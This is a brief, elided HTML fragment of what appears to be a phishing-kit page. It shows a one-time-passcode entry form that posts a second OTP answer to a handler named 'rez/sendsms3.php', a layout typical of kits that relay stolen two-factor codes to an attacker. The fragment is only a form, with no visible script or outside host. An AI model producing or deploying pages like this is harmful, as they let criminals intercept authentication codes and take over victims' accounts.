...
<div class="wrapper-mapwap"><div class="main-block" id="content" role="main">
	...
	<form id="otp-entry-form" action="rez/sendsms3.php" method="post" autocomplete="off">
    ...
    border: 0.0625rem solid #000;" minlength="4" maxlength="8" name="otpanswer2" type="tel" autocomplete="off" required>
